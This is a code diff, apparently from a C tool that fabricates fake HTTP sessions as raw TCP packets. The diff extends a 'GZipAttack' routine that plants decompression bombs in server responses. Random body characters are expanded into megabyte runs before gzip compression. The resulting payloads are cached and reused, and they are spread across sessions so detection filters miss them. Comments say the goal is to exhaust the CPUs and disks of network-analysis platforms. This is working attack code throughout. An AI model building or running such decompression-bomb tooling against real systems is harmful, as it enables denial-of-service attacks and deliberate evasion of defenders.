@@ -250,7 +250,7 @@ void L_link_ordered(LINK **list, LINK *ele) {
     _last = L_last(*list);
     // and append this to that one..
     _last->next = ele;
-  }
+}
 
   
   
@@ -343,7 +343,7 @@ int prepare_socket() {
     int one = 1;
     
     rawsocket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (setsockopt(rawsocket,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one)) < 0)
+    if (setsockopt(rawsocket, IPPROTO_IP,IP_HDRINCL, (char *)&one, sizeof(one)) < 0)
         return -1;
 
     raw_socket = rawsocket;
@@ -420,7 +420,7 @@ int FlushAttackOutgoingQueueToNetwork() {
 int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
     AttackOutgoingQueue *optr = NULL;
 
-    if ((optr = (AttackOutgoingQueue *)calloc(1,sizeof(AttackOutgoingQueue))) == NULL) {
+    if ((optr = (AttackOutgoingQueue *)calloc(1, sizeof(AttackOutgoingQueue))) == NULL) {
         return -1;
     }
 
@@ -459,7 +459,7 @@ int AS_session_queue(int id, uint32_t src, uint32_t dst, int src_port, int dst_p
     AS_attacks *aptr = NULL;
 
     if ((aptr = (AS_attacks *)calloc(1, sizeof(AS_attacks))) == NULL)
-        return -1;
+        return 0;
 
     // identifier for the attack..in case we need to find it in queue later
     aptr->id = id;
@@ -480,7 +480,7 @@ int AS_session_queue(int id, uint32_t src, uint32_t dst, int src_port, int dst_p
 
     // what function will be used to generate this sessions parameters? (ie: HTTP_Create())
     aptr->function = function;
-
+    
     // LIFO i decided it doesnt matter since the attacks are all happening simultaneously...
     // if it becomes a problem its a small fix.  but your queues should also flush properly anyhow..
     aptr->next = attack_list;
@@ -740,8 +740,10 @@ int AS_perform() {
 
 // free a pointer after verifying it even exists
 void PtrFree(char **ptr) {
-    if (*ptr) free(*ptr);
-    *ptr = NULL;
+    if (ptr != NULL && *ptr) {
+        free(*ptr);
+        *ptr = NULL;
+    }
 }
 
 // clean up the structures used to keep information required for building the low level network packets
@@ -781,6 +783,8 @@ void AttackFreeStructures(AS_attacks *aptr) {
 
     // free packets already prepared in final outgoing structure for AS_queue()
     PacketsFree(&aptr->packets);
+
+    //if (aptr->extra_attack_parameters) PtrFree((char **)&aptr->extra_attack_parameters);
 }
 
 
@@ -1468,6 +1472,7 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     PacketBuildInstructions *bptr = NULL;
     PacketBuildInstructions *build_list = NULL;
     ConnectionProperties cptr;
+    HTTPExtraAttackParameters *eptr = NULL;
     int i = 0;
 
     // these are in headers.. and seems to be +1 fromm start..
@@ -1486,6 +1491,15 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
 
     uint32_t client_seq = rand()%0xFFFFFFFF;
     uint32_t server_seq = rand()%0xFFFFFFFF;
+    
+    int body_size = 0;
+    char *body = (char *)malloc(server_size + 1);
+    
+    if (body != NULL) {
+        memcpy(body, server_body, server_size);
+        body_size = server_size;
+    }
+
 
     //OsPick(int options, int *ttl, int *window_size)
     OsPick(OS_XP|OS_WIN7, &cptr.client_ttl, &cptr.max_packet_size_client);
@@ -1506,11 +1520,18 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     cptr.server_emulated_operating_system = 0;
     
     // would we like to inject some GZip attacks? Lets keep it down to 10% for now (obviously ill make it dynamic/controlled w strategy later)
-    i = rand()%10;
-    if (i) {
-        //int GZipAttack(int options, int *size, char **server_body, int attack_size, int how_many_different_insertions)
-        // lets do 100meg inserts... 50 times
-        //GZipAttack(0,&server_size, &server_body, 1024*1024*100, 50);
+    eptr = (HTTPExtraAttackParameters *)aptr->extra_attack_parameters;
+    if (eptr) {
+        if (eptr->gzip_attack) {
+            if ((rand()%100) <= eptr->gzip_percentage) {
+                // this is one of the sessions we will insert the gzip attacks in..
+                // in future right here we would send information to another PID, or thread
+                // stating it should calculate gzip and send back the body for us
+                // ill work out later how to do it with more advanced http sefssions
+                // such as using identity lists from databases, etc
+                GZipAttack(0, &body_size, &body, eptr->gzip_size, eptr->gzip_injection_rand);
+            }
+        }
     }
 
     // open the connection...
@@ -1520,7 +1541,7 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     if (GenerateTCPSendDataInstructions(&cptr, &build_list, 1, client_body, client_size) != 1) goto err;
     
     // now we must send data from the server to the client (web page body)
-    if (GenerateTCPSendDataInstructions(&cptr, &build_list, 0, server_body, server_size) != 1) goto err;
+    if (GenerateTCPSendDataInstructions(&cptr, &build_list, 0, body, body_size) != 1) goto err;
 
     // now lets close the connection from client side first
     if (GenerateTCPCloseConnectionInstructions(&cptr, &build_list, 1) != 1) goto err;
@@ -1531,34 +1552,36 @@ int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, u
     // now lets build the low level packets for writing to the network interface
     BuildPackets(aptr);
 
+    if (body != NULL) free(body);
+
     // all packets done! good to go!
     return 1;
     err:;
     return -1;
 }
 
+int total_gzip_count = 0;
 
+char *gzip_cache = NULL;
+int gzip_cache_size = 0;
+int gzip_cache_count = 0;
 
-// inject gzip attacks randomly into a message which is to be delivered via HTTP as a responsse from a server
-// it will attack the analysis engines of the surveillance platforms themselves.. and if done correctly (changing, etc)
-// it will be impractical to detet until its already decompressing lots of data..
-// we dont have to do a 10gigabytes, etc at a single location..
-// we can spread that into 150-300 different locations (normal bytes of a body) therefore it will stay below their
-// analysis engines attempts to detect >10megabyte, or other guesses data expecting to be decommpressed...
-// the fact is.. we are fabricating possibly millions of connections.. who gives a fuck if we can only do 10megabytes GZIP every
-// few characters instead of gigabytes at one location?
-// https://github.com/cyberisltd/GzipBloat
-// It will take a body, rewrite it adjusting its size.. adding gzip attacks randomly by parameters,
-// and returning an updated HTTP response + header :)...
-// they aint ready.
-// this further ensures these systems are bogged down and useless.
-// if the content is already gzip'd thnen we will have to unzip to rezip with the proper manipulations..
-// otherwise we just pick sommewhere
+// This function will perform a GZIP Attack on a body.  I wrote it to take a previously compressed HTTP result, decompress it,
+// insert attacks, recompress it, replace the original, and to cache it for future use.  The caching will reuse the same
+// packet for 15 times before retiring it.  
+// If you consider generating thousands of connections every second, then it would be pretty tough for platforms to create
+// seekers to find 15 similar GZIP responses from packets that have different source ports/ips/ &destinations.  I wouldn't
+// believe that reusing a GZIP attack 15 minutes will merrit any decent way of filtering.
+// The parameters are attack size, ,and how many insertions.  The insertions if a modular operation variable which would be the maximum
+// amount of injections between 1 and that value.  The size will take randomm characters within the plain text data, mark them, and whenever
+// compressing to repeat those specific characters a million times to generate a single megabyte of information for each injection location.
+// Compression on top of all other analysis engines used to generate actual intelligence from raw internet data would clog those
+// threads, CPUs, and possibly even hard drives up drastically.
 int GZipAttack(int options, int *size, char **server_body, int attack_size, int how_many_different_insertions) {
     int i = 0, n = 0, y = 0, q = 0, r = 0;
     char *data = NULL;
     int data_size = 0;
-    char *sptr = 0;
+    char *sptr = 0, *header_end_ptr=NULL;
     int zip_size = 0;
     z_stream infstream;
     z_stream outstream;
@@ -1566,15 +1589,46 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
     int compressed_size = 0;
     int compressed_in = 0;
     int compressed_out = 0;
-    char data_to_compress[1024];
     char *buf = NULL;
     int next_i = 0;
     char *zptr = NULL;
     char *compressed_realloc = NULL;
+    int compression_max_size = 0;
+    int ret = -1;
+    int header_size = 0;
 
     // will contain 0 or 1 where  insertions go
     // this coould be a bitmask whatever.. dont care atm
     char *insertions = NULL;
+
+    // it was taking 8-11minutes at 10%/1megabyte...
+    // with only compressing 1 every 10-100 uses kept it between 2 minutes and 2min:10
+    // 15 was is 2 minutes 4 seconds for 43k gzip attack injections.. each between 1-5 count of 1megabyte injections
+    // the megabytes are the same character randomly in the output 1meg times
+    if (gzip_cache && gzip_cache_count > 0) {
+        buf = (char *)malloc(gzip_cache_size);
+        if (buf == NULL) return 0;
+        memcpy(buf, gzip_cache, gzip_cache_size);
+
+        gzip_cache_count--;
+
+        // free original server body so that we can copy over this cached one fromm the previous gzi attack
+        PtrFree(server_body);
+
+        // move the pointer of our coppy for the calling function...
+        *server_body = buf;
+        // set proper size from cache size
+        *size = gzip_cache_size;
+
+        // keep count (for debugging, remove)
+        total_gzip_count++;
+
+        return 1;
+    } else {
+        PtrFree(&gzip_cache);
+        gzip_cache_count = 0;
+        gzip_cache_size = 0;
+    }
 
     srand(time(0));
     // first we unzip it so we can modify..
@@ -1589,6 +1643,10 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
             // need to find out why the server responded with 180 here.. is it a size? related sommehow to gzip? or chunked? deal w it later
             sptr = strstr((char *)sptr, "\r\n");
             sptr += 2;
+            // keep information on when the header ends..
+            header_end_ptr = sptr;
+            header_size = (int)((char *)sptr - (char *)*server_body);
+            //printf("\rHeader Size: %d\t\n", header_size);
 
             // sptr should have the correct location now..lets get the size...
             zip_size = (int)(((*server_body) + *size) - sptr);
@@ -1596,34 +1654,35 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
             // we must decompress the information first
             // being relaxed coding this.. will be more precise later.. just giving twice the space..
             data = (char *)calloc(1, zip_size * 2);
-            if (data != NULL) {
-                // simple gzip decompression
-                //https://gist.github.com/arq5x/5315739
-                infstream.zalloc = Z_NULL;
-                infstream.zfree = Z_NULL;
-                infstream.opaque = Z_NULL;
+            if (data == NULL) goto end;
 
-                infstream.avail_in = zip_size;
-                infstream.next_in = (Bytef *)sptr;
+            // simple gzip decompression
+            //https://gist.github.com/arq5x/5315739
+            infstream.zalloc = Z_NULL;
+            infstream.zfree = Z_NULL;
+            infstream.opaque = Z_NULL;
 
-                infstream.avail_out = (uInt)(zip_size * 2);
-                infstream.next_out = (Bytef *)data;
+            // how many bytes were in server body compressed
+            infstream.avail_in = zip_size;
+            infstream.next_in = (Bytef *)sptr;
 
-                // execute proper zlib functions for decompression
-                inflateInit2(&infstream, 15+16);
-                inflate(&infstream, Z_NO_FLUSH);
-                inflateEnd(&infstream);
-                
-                // data contains the decompressed data now.. lets get the size..
-                data_size = infstream.total_out;
+            // max size we allocated for decompression is twice as much as the original size
+            // this is acceptable for real files.. injections like our attack could obviously be more..
+            infstream.avail_out = (uInt)(zip_size * 2);
+            infstream.next_out = (Bytef *)data;
 
-                printf("decompressed %lu\n", infstream.total_out);
-
-            }
+            // execute proper zlib functions for decompression
+            inflateInit2(&infstream, 15+16);
+            inflate(&infstream, Z_NO_FLUSH);
+            inflateEnd(&infstream);
+            
+            // data contains the decompressed data now.. lets get the size..
+            data_size = infstream.total_out;
         }
     }
     
 
+    // if we had no decompressed data.. it wasnt gzip'd and then we can just use the original body
     if (data == NULL) {
         data = *server_body;
         data_size = *size;
@@ -1631,41 +1690,34 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
 
     // allocte space for a structure which will contain which locations will get an injection
     insertions = (char *)calloc(1, *size);
+
     // allocate space for the compressed output...
-    compressed = (char *)calloc(1, data_size * (600*3));
+    compression_max_size = data_size * (600 * 3);
+    compressed = (char *)malloc(compression_max_size + 1);
+
     // buffer for injecting attack
-    buf = (char *)calloc(1, attack_size);
+    buf = (char *)calloc(1, attack_size + 1);
 
     // ensure both were allocated properly..
-    if ((insertions == NULL) || (compressed == NULL) || (buf == NULL)) {
-        if (data != *server_body) free(data);
+    if ((insertions == NULL) || (compressed == NULL) || (buf == NULL))
+        goto end;
 
-        if (buf != NULL) free(buf);
-        if (compressed != NULL) free(buf);
-        if (insertions != NULL) free(buf);
-        
-        return -1;
-    }
-
-    // how many places will we insert? lets randomly pick & mark them
+    // how many places will we insert? lets randomly pick how many & mark them
     i = 1 + (rand() % (how_many_different_insertions - 1));
-    //i = how_many_different_insertions;
 
-    printf("how many places do we insert %d\n", i);
     // if its too many for this server body.. lets do it 1 less time than all characters
     if (i > data_size) i = data_size - 1;
 
+    // lets pick random spots for gzip injection attacks
     while (i > 0) {
-        n = rand()%*size;
+        n = rand() % *size;
+
         // make suree we didnt already mark this byte..
-        if (insertions[n] == 1) {
+        if (insertions[n] == 1)
             continue;
-        }
 
         // mark the location where we would like to insert this attack
         insertions[n] = 1;
-
-        printf("marking byte %d %d\n", n, insertions[n]);
 
         i--;
     }
@@ -1674,46 +1726,42 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
     outstream.zfree = Z_NULL;
     outstream.opaque = Z_NULL;
 
-    // execute proper zlib functions for decompression
-    if (deflateInit2 (&outstream, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15|16, 8, Z_DEFAULT_STRATEGY) != Z_OK) {
-        printf("gzip init error\n");
+    // execute proper zlib functions for compression (to insert our attacks)
+    if (deflateInit2(&outstream, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15|16, 8, Z_DEFAULT_STRATEGY) != Z_OK) {
+        goto end;
     }
 
-    // compress data injecting attacks at bytes required..
+    // loop through the entire body finding the locations of where the injections should take place
     sptr = data;
     while (sptr < (data + data_size)) {
-
-        printf("sptr %p data %p size %d sptr - data = %d\n", sptr, data, data_size, sptr-data);
-
+        // lets see how many bytes from now before we reach a location we decided to insert an attack
+        // i did this just in case it would increase space if i kept the bytes going in 1, or really small..
+        // i didnt care to read too far into the zlib source
         zptr = sptr;
         next_i = 0;
         while (!next_i && (zptr <= (data + data_size))) {
             y = zptr - data;
+            // if this is a location then we calculate the bytes from the current pointer to it
             if (insertions[y] == 1) {
                 next_i = zptr - sptr;
-                printf("next_i %d\n", next_i);
+
                 break;
             }
-        
             zptr++;
         }
 
         // we dont have anymore injections to insert.. so we compress the rest of the data..
         if (next_i == 0) {
             y = (data + data_size) - sptr;
-            printf("y = %d\n", y);
         } else {
             // we have a location to insert the next at.. so we want to compress everything until that location...
             y = next_i;
-            printf("y2 = %d\n", y);
         }
 
         // our current location...
         n = sptr - data;
         // check if we are supposed to insert here...
         if (insertions[n] == 1) {
-            printf("INJECTING\n");
-            printf("current has inj: %d\n", n);
             // set all of buf (attack buf) to the current character
             memset(buf, *sptr, attack_size);
 
@@ -1721,7 +1769,7 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
             outstream.next_in = (Bytef *)buf;
 
             // we output it but calculate just so there are no bullshit issues later
-            outstream.avail_out = (uInt)((data_size * (600*3)) - compressed_out);
+            outstream.avail_out = (uInt)(compression_max_size - compressed_out);
             outstream.next_out = (Bytef *)(compressed + compressed_out);
 
             // run the zlib command so it compresses using it...
@@ -1729,7 +1777,6 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
 
             // update our information for how many bytes are located in compressed_out..
             compressed_out = outstream.total_out;
-            printf("INJ total out %lu total in %lu\n", outstream.total_out, outstream.total_in);
 
             // done this one..
             insertions[n] = 0;
@@ -1737,69 +1784,98 @@ int GZipAttack(int options, int *size, char **server_body, int attack_size, int 
             continue;
         }
 
+        // compress data at sptr by y length
         outstream.avail_in = y;
-        //printf("avail in %d\n", y);
         outstream.next_in = (Bytef *)sptr;
-        outstream.avail_out = (uInt)((data_size * (600*3)) - compressed_out);
+        outstream.avail_out = (uInt)(compression_max_size - compressed_out);
         outstream.next_out = (Bytef *)(compressed + outstream.total_out);
     
+        // keep track of parameters before, and after compression so we can accurately calculate
         n = outstream.total_in;
         q = outstream.total_out;
         i = deflate(&outstream, Z_NO_FLUSH);
-        //if (i != 0) printf("i %d\n", i);
-        /*
-        if (i == -5) {
 
-            printf("realloc %p errno %d\n", compressed, errno);
-            compressed_realloc = (char *)realloc((void *)compressed, outstream.total_out * 2);
-            if (compressed == compressed_realloc) {
-                // lets try to flush?
-                
-            }
-            printf("realloc %p errno %d\n", compressed, errno);
-        }*/
+        // not enough buffer space.. lets realloc
+        if (i == -5) {
+            compression_max_size *= 2;
+            compressed_realloc = (char *)realloc((void *)compressed, compression_max_size + 1);
+            
+            // error couldnt allocate
+            if (compressed == compressed_realloc)
+                goto end;
+
+            compressed = compressed_realloc;
+        }
+
         y = outstream.total_in;
         r = outstream.total_out;
 
-        printf("total in in %d\n", outstream.total_in);
         // update by how many bytes went out..
         compressed_in += (y - n);
         compressed_out = outstream.total_out;
 
-        printf("total out %lu total in %lu\n", outstream.total_out, outstream.total_in);
-        
         // increase sptr by the amount of bytes
         sptr += (y - n);
 
-        if (sptr == (data + data_size)) {
+        // we are done.. have to call this to complete the compression..
+        if (sptr >= (data + data_size)) {
             outstream.avail_in = 0;
             deflate(&outstream, Z_FINISH);
         }
         
-        printf("total out %lu total in %lu\n", outstream.total_out, outstream.total_in);
         compressed_out = outstream.total_out;
     }
 
     deflateEnd(&outstream);
 
-    // some doc online said to use these parameters for gzip.. after testing ill check it out..
-    //wbits = zlib.MAX_WBITS | 16
+    // If no data was first decompressed earlier, then we would be using the same pointer as we were first given. no need to free that..
+    if (data != *server_body) PtrFree(&data);
+
+    // free the attack buffer..
+    PtrFree(&buf);
+
+    // re-use the attack buffers pointer to merge the original header, and the compressed data together..
+    // *** todo: add gzip content type to a header that wasnt originally compressed
+    buf = (char *)malloc(compressed_out + header_size + 1);
+    if (buf == NULL) goto end;
+    memcpy(buf, *server_body, header_size);
+    memcpy(buf + header_size, compressed, compressed_out);
+
+    // free the compression buffer from whenever we built the attack
+    PtrFree(&compressed);
+
+    *server_body = buf;
+    // so this doesnt get freed again below...
+    buf = NULL;
+    // set size for calling function to pass on for building http packets
+    *size = compressed_out + header_size;
 
 
-    // free the decompression buffer.. if its still allocated
-    if (data != *server_body) free(data);
-
-    // free the origin calling function's buffer, and replace with our new compression buffer
-    free(*server_body);
-    *server_body = compressed;
-    *size = compressed_out;
+    // cache this gzip attack for the next 15 requests of another
+    if (gzip_cache == NULL) {
+        gzip_cache = (char *)malloc(*size + 1);
+        if (gzip_cache != NULL) {
+            memcpy(gzip_cache, *server_body, *size);
+            gzip_cache_size = *size;
+            gzip_cache_count = 15;
+        }
+    }
     
+    total_gzip_count++;
+    //printf("\rgzip injected\t\t\n");
+    ret = 1;
+end:;
+
+    // free the decompression buffer.. if its still allocated (and wasnt replaced after a successful compression)
+    if (ret != 1 && data != *server_body) PtrFree(&data);
+
     // free the insertion (table) we used to randomize our insertions
-    free(insertions);
+    PtrFree(&insertions);
 
     // free the attack buffer (which was used to set the current character X times so it would be compressed by that X size)
-    free(buf);
-    return 1;
+    PtrFree(&buf);
+
+    return ret;
 }
 
 
@@ -1824,20 +1900,37 @@ int G_server_body_size = 0;
 // its smart to keep it separate fromm AS_session_queue() so AS_session_queue() can call this, or other functions
 // to fabricate sessions of different protocols
 void *HTTP_Create(AS_attacks *aptr) {
-    
     int i = 0;
+    HTTPExtraAttackParameters *eptr = NULL;
+
+    eptr = (HTTPExtraAttackParameters *)calloc(1, sizeof(HTTPExtraAttackParameters));
+    if (eptr != NULL) {
+        // enable gzip attacks
+        eptr->gzip_attack = 1;
+        // percentage of sessions to perform gzip attacks on
+        eptr->gzip_percentage = 3;
+        // size of the gzip injections (100 megabytes here)
+        eptr->gzip_size = 1024*1024 * 1;
+        // between 1-5 injections
+        eptr->gzip_injection_rand = 5;
+        // how many times to reuse the same cache before creating a new one?
+        //eptr->gzip_cache_count = 5000;
+    }   
+ 
+    // attach the extra attack parameters to this session
+    aptr->extra_attack_parameters = eptr;
     
     #ifndef BIG_TEST
         printf("client body %p size %d\nserver body %p size %d\n",G_client_body, G_client_body_size, G_server_body,
                  G_server_body_size);
     #endif
-    
-        // lets try new method    
-        i = BuildHTTPSession(aptr,aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,G_server_body,
-                     G_server_body_size);
-    
+
+    // lets try new method    
+    i = BuildHTTPSession(aptr,aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,
+        G_server_body, G_server_body_size);
+
     #ifndef BIG_TEST
-        printf("GenerateBuildInstructionsHTTP() = %d\n", i);
+        printf("BuildHTTPSession() = %d\n", i);
     
         printf("Packet Count: %d\n", L_count((LINK *)aptr->packets));
     #endif
@@ -1985,7 +2078,7 @@ int main(int argc, char *argv[]) {
     
 #ifdef GZIPTEST
     // lets test gzip
-    GZipAttack(0,&G_server_body_size, &G_server_body, 1024*1024*100, 11);
+    GZipAttack(0,&G_server_body_size, &G_server_body, 1024*1024*100, 50);
 
     // lets write to output...
     fd = fopen("test.gz","wb");
@@ -2053,6 +2146,8 @@ int main(int argc, char *argv[]) {
     if (network_queue)
         printf("packet count ready for wire: %d\n", L_count((LINK *)network_queue));  
 
+
+    printf("Gzip Count: %d\n", total_gzip_count);
     // now lets write to pcap file.. all of those packets.. open up wireshark.
     dump_pcap((char *)"output.pcap", network_queue);
 
